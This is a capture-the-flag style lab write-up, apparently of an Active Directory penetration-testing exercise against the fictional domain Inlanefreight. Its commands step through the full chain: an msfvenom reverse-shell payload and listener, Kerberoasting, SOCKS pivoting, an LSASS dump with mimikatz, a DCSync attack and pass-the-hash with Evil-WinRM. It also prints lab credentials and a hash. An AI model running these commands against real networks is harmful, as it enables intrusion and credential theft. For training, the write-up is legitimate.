## Scenario

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

---


We get an antak.aspx webshell. To upgrade this shell I created a new one with msfvenom 
```bash
msfvenom -p meterpreter/windows/reverse_tcp LHOST:10.10.15.6 LPORT:4444 -f exe -outfile shell.exe
```
To catch this shell I also started a listener
```bash
msfconsole
use multi/handler
set payload meterpreter/windows/reverse_tcp
set LHOST 10.10.15.6
run
```

Now we have a meterpreter session with the target.

To find out what account uses the `MSSQLSvc/SQL01.inlanefreight.local:1433` SPN, I used the following command
```powershell
setspn.exe -Q */*
```

The output shows the `svc_sql` user uses this specific SPN.

With PowerView we can dump the TGS hash
```powershell
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```
Next we can try to crack the hash with Hashcat mode 13100
It reveals the password `lucky7`.

Next we want to pivot the `MS01`. To get to know the IP address of this host, we can simply ping to `ms01`. It shows the IP address of 172.16.6.50. Because our attack host is not in the same subnet as `MS01`, we can use proxychains to pivot from the initial target.

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Now we can go back to our meterpreter session and add the routes.
```bash
meterpreter > run autoroute -s 172.16.6.0/24
```

Now we can use the following command to RPD to `MS01` and create a shared folder with tools such as mimikatz and powerview.
```bash
proxychains xfreerdp /u:svc_sql /p:lucky7 /v:172.16.6.50 /drive:SharedTools,/home/htb-ac-1473407/Desktop/Tools/
```

We use mimikatz to dump the loggon users:
```powershell
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
This will dump the users that are logged in. Here we see the user `tpetty`. 

Change this key to view the password in cleartext.
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" | Select-Object UseLogonCredential
```

To check what Access Control List permissions `tpetty` has we use the next command:
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid tpetty

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

We see from the output that `tpetty` has the `DS-Replication-Get-Changes` object type. This means she can perform a DCSync attack.

We can do this with mimikatz. First we need to run powershell as `tpetty`
```powershell
runas /netonly /user:INLANEFREIGHT\tpetty powershell
```
Now we launch mimikatz and perform the attack
```powershell
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

The hash of the administrator is `27dedb1dab4d8545c6e1c66fba077da0`. We can use this hash to connect to DC01 with Evil-WinRM. To get the IP of DC01 we can ping again, 172.16.6.3.

We can still use the proxychains from the attack host to connect to DC01.
```bash
proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
```
Now we have a PowerShell session as the domain admin.